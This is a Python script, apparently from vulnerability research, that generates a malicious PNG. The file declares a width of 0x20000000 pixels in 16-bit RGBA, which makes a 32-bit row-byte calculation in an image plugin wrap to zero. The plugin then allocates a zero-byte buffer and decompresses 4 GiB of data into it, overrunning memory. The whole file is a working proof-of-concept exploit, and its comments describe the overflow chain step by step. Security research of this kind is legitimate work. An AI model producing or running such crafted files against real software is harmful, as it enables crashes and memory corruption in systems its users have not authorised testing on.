#!/usr/bin/env python3
# gen_png_wrap.py -- the wrap trigger PNG.
#   width=0x20000000 (536M), height=1, 16-bit RGBA (bpp=8)
#   dstRowBytes = 0x20000000 * 8 = 2^32 -> wraps to 0  (32-bit mul w in the plugin)
#   allocation  = height * dstRowBytes = 1 * 0 = 0   -> malloc(0) -> tiny buffer
#   IDAT decompresses to 1 filter byte + 4GB of row data -> inflate writes 4GB
#   into a 0-byte buffer -> massive OOB -> crash.
import struct, zlib, binascii, os, sys, time

OUT = sys.argv[1] if len(sys.argv) > 1 else "/home/box/.hermes/profiles/seraphine/cache/scratch/pngs"
os.makedirs(OUT, exist_ok=True)

def chunk(typ, payload):
    return struct.pack(">I", len(payload)) + typ + payload + struct.pack(">I", binascii.crc32(typ + payload) & 0xffffffff)

W  = 0x20000000          # 536870912
H  = 1
BD = 16; CT = 6          # 16-bit RGBA -> bytesPerPixel = 8
rowbytes = W * 8         # 0x100000000 = 4 GiB  (wraps to 0 in 32-bit)

print(f"width={W} height={H} 16-bit RGBA  rowbytes={rowbytes} (0x{rowbytes:x})  -> 32-bit wraps to {rowbytes & 0xffffffff}")

# IDAT = zlib( filter_byte(0x00) + rowbytes of zeros )  -> decompressed = 1 + 4GiB
t0 = time.time()
co = zlib.compressobj(6)
out = bytearray()
out += co.compress(b"\x00")                 # filter byte for the single scanline
zeros = b"\x00" * (1024 * 1024)             # 1 MiB chunk
fed = 0
while fed < rowbytes:
    n = min(len(zeros), rowbytes - fed)
    out += co.compress(zeros[:n])
    fed += n
out += co.flush()
idat = bytes(out)
print(f"IDAT: decompressed {1+rowbytes} bytes -> compressed {len(idat)} bytes  ({time.time()-t0:.1f}s)")

sig  = bytes.fromhex("89504E470D0A1A0A")
ihdr = struct.pack(">IIBBBBB", W, H, BD, CT, 0, 0, 0)
png  = sig + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")
p = os.path.join(OUT, "wrap_536Mx1_rgba16.png")
open(p, "wb").write(png)
print(f"\nwrote {p}  ({len(png)} bytes total; IDAT {len(idat)} bytes)")
print("expect: dstRowBytes wraps to 0 -> malloc(0) -> inflate writes 4GiB into 0-byte buffer -> OOB")
